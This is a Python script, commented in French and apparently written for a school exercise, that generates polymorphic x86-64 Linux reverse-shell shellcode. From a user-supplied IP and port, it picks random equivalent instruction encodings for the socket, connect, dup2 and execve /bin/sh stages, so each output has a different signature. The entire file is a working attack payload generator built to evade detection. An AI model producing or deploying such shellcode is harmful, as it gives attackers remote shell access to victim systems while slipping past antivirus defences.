import random, sys

shellcode = ""

shellcodeart = '''
__________      .__          _________.__           .__  .__            ___________ _________ ________.___ 
\______   \____ |  | ___.__./   _____/|  |__   ____ |  | |  |           \_   _____//   _____//  _____/|   |
 |     ___/  _ \|  |<   |  |\_____  \ |  |  \_/ __ \|  | |  |    ______  |    __)_ \_____  \/   \  ___|   |
 |    |  (  <_> )  |_\___  |/        \|   Y  \  ___/|  |_|  |__ /_____/  |        \/        \    \_\  \   |
 |____|   \____/|____/ ____/_______  /|___|  /\___  >____/____/         /_______  /_______  /\______  /___|
                     \/            \/      \/     \/                            \/        \/        \/     
'''

###### Fonctions ######


#Récupération des paramètres

#Vérification que l'ip et le port sont fournis en paramètres.

if len(sys.argv) != 3:
    print("Paramètres incorrecte lancez le programme de cette manière : python generateur.py 10.10.10.10 4444")
    exit(1)
else:
    ipv4 = sys.argv[1]
    port = sys.argv[2]

#Transformation de l'ip en hexa pour être utilisée dans le shellcode.

def ip_to_hex(ip):
    # Vérifier si l'adresse IP est valide en vérifiant que chaque partie est un entier entre 1 et 255
    if not all(1 <= int(byte) <= 255 for byte in ip.split('.')):
        print("IP incorrecte. Assurez-vous d'utiliser des valeurs (1-255).")
        exit(1)
    # Convertir chaque partie de l'adresse IP en une chaîne hexadécimale
    hex_parts = (format(int(byte), 'X').zfill(2) for byte in ip.split('.'))

    # Joindre les parties hexadécimales pour former la représentation hexadécimale complète
    return ''.join(hex_parts)

#Transformation du port en hexa puis inversement de l'ip pour être utilisé dans le shellcode.

def port_to_hex(port):
    port_hex = hex(int(port))[2:]  # Convertir le port en hexadécimal et enlever le préfixe "0x"
    if len(port_hex) % 2 != 0:
        port_hex = '0' + port_hex  # Ajouter un zéro au début si la longueur est impaire

    return(port_hex)

#Fonction qui ajoute les "\x" au shellcode.

def shellcodize(s):
    shellcode = 'X'
    shellcode += 'X'.join(a+b for a,b in zip(s[::2], s[1::2]))
    shellcode = shellcode.replace('X', '\\x')
    print("Shellcode polymorphique: \n")
    print(shellcode, "\n")
    

# Passage des paramètres dans les fonctions.

ipv4 = ip_to_hex(ipv4)
port = port_to_hex(port)

###### CREATION SOCKET ######

#mov al, 41 -> B029
#mov al, 40 - add al, 1 -> b0280401
#mov al, 42 - sub al, 1 -> b02a2c01

create_socket_1 = ["B029", "b0280401", "b02a2c01"]
shellcode += random.choice(create_socket_1)

#xor rdi, rdi -> 4831FF
# xor r8, r8 - mov rdi, r8 -> 4D31C04C89C7

create_socket_2 = ["4831FF", "4D31C04C89C7"]
shellcode += random.choice(create_socket_2)

#add rdi, 2 -> 4883C702
#mov dil, 2 -> 40B702
#mov dil, 3 - sub dil, 1 -> 40B7034080EF01

create_socket_3 = ["4883C702", "40B702", "40B7034080EF01"]
shellcode += random.choice(create_socket_3)

#xor rsi, rsi -> 4831F6
#xor r8, r8 - mov rsi, r8 -> 4D31C04C89C6

create_socket_4 = ["4831F6", "4D31C04C89C6"]
shellcode += random.choice(create_socket_4)

#add rsi, 1 -> 4883C601
#mov sil, 1 -> 40B601
# mov sil, 2 - sub sil, 1 -> 40B6024080EE01 

create_socket_5 = ["4883C601", "40B601", "40B6024080EE01"]
shellcode += random.choice(create_socket_5)

#xor rdx, rdx -> 4831D2
#xor r8, r8 - mov rdx, r8 -> 4D31C04C89C2

create_socket_6 = ["4831D2", "4D31C04C89C2"]
shellcode += random.choice(create_socket_6)

#syscall -> 0F05

create_socket_syscall = ["0F05"]
shellcode += random.choice(create_socket_syscall)

#mov r9, rax -> 4989C1

create_socket_mov = ["4989C1"]
shellcode += random.choice(create_socket_mov)


###### CONNEXION SOCKET ######


#push 0x2A -> 6A2A

connexion_socket_1 = ["6A2A"]
shellcode += random.choice(connexion_socket_1)

#pop rax -> 58

connexion_socket_2 = ["58"]
shellcode += random.choice(connexion_socket_2)

#mov rdi, r9 -> 4C89CF

connexion_socket_3 = ["4C89CF"]
shellcode += random.choice(connexion_socket_3)

#push rdx -> 52
#push rdx -> 52

connexion_socket_4 = ["5252"]
shellcode += random.choice(connexion_socket_4)

#push  -> 68 et ajout de l'ip

connexion_socket_5 = ["68"]
connexion_socket_5.append(ipv4)
connexion_socket_5 = ''.join(connexion_socket_5)
shellcode += (connexion_socket_5)

#push word et ajout du port

connexion_socket_6 = ["6668"]
connexion_socket_6.append(port)
connexion_socket_6 = ''.join(connexion_socket_6)
shellcode += (connexion_socket_6)

#push word 0x02 -> 666A02

connexion_socket_7 = ["666A02"]
shellcode += random.choice(connexion_socket_7)

#mov rsi, rsp -> 4889E6
# xor r8, r8 - mov r8, rsp - mov rsi, r8 -> 4D31C04989E04C89C6
#xor r9, r9 - mov r9, rsp - mov rsi, r9 -> 4D31C94989E14C89CE

connexion_socket_8 = ["4889E6", "4D31C04989E04C89C6", "4D31C94989E14C89CE"]
shellcode += random.choice(connexion_socket_8)

#add rdx, 0x10 -> 4883C210

connexion_socket_9 = ["4883C210"]
shellcode += random.choice(connexion_socket_9)

#syscall -> 0F05

connexion_socket_10 = ["0F05"]
shellcode += random.choice(connexion_socket_10)

#xor rsi, rsi -> 4831F6
#xor r8, r8 - mov rsi, r8 -> 4D31C04C89C6
# mov sil, 1 - sub sil, 1 -> 40B6014080EE01

connexion_socket_11 = ["4831F6"]
shellcode += random.choice(connexion_socket_11)

#mov sil, 2 -> 40B602
#xor r8, r8 - mov r8b, 2 - mov sil, r8b -> 4D31C041B0024488C6
#xor r9, r9 - mov r9b, 2 - mov sil, r9b -> 4D31C941B1024488CE

connexion_socket_12 = ["40B602", "4D31C041B0024488C6", "4D31C941B1024488CE"]
shellcode += random.choice(connexion_socket_12)

# xor rax, rax [Default] -> 4831c0
# xor r8, r8 - mov rax, r8 -> 4d31c04c89c0

list_xorloop = ["4831c0", "4d31c04c89c0"]
shellcode += random.choice(list_xorloop)

# mov al, 0x21 -> b021 [Default]

list_loop = ["b021"]
shellcode += random.choice(list_loop)


# Constante = 0F0548ffce7df4

list_loopconstante = ["0F0548ffce7df4"]
shellcode += random.choice(list_loopconstante)

# xor rax, rax - xor rdx, rdx -> 4831c04831d2 [Default]
# xor rdx, rdx - xor rax, rax -> 4831d24831c0
# mov rax, rdx - xor rax, rdx - xor rdx, rdx -> 4889d04831d04831d2

list_xor = ["4831c04831d2" , "4831d24831c0", "4889d04831d04831d2"]
shellcode += random.choice(list_xor)


# mov rbx, 0x68732f6e69622f2f [Default] -> 48BB2F2F62696E2F7368
# mov rbx, 0x68732f6e584d0a31 - add rbx, 0x111524fe -> 48BB310A4D586E2F73684881C3FE241511 

list_binbash = ["48BB2F2F62696E2F7368", "48BB310A4D586E2F73684881C3FE241511"]
shellcode += random.choice(list_binbash)

# Constante = 50534889E750574889E6

list_stackconst = ["50534889E750574889E6"]
shellcode += random.choice(list_stackconst)

# mov al, 0x3b -> B03B
# mov al, 0x3a - add al, 0x01 -> B03A0401

list_execve = ["B03B", "B03A0401"]
shellcode += random.choice(list_execve)

# Constante = 0f05

list_constcallsys = ["0f05"]
shellcode += random.choice(list_constcallsys)

# mov al, 60 -> B03C
# mov al, 99 - sub al, 39 -> B0632C27
# mov al, 30 - add al, 30 -> B01E041E
# mov dl, 60 - mov rax, rdx -> B23C4889D0

list_exit = ["B03C" ,"B0632C27", "B01E041E" ,"B23C4889D0"]
shellcode += random.choice(list_exit)

# xor rdi, rdi [Default] -> 4831FF
# xor r8, r8 - mov rdx, r8 -> 4D31C04C89C2
# mov dl, 1 - sub dl, 1 -> b20180ea01

list_xorsyscall = ["4831FF", "4D31C04C89C2","b20180ea01"]
shellcode += random.choice(list_xorsyscall)

# Constante = 0f05

list_lastcallsys = ["0f05"]
shellcode += random.choice(list_lastcallsys)


# ASCII Art
print(shellcodeart)

#Affichage du shellcode et de sa taille
print("------------\n")
print("La taille du shellcode est de : ",(len(shellcode)), "octets")
print("\n")
shellcodize(shellcode)
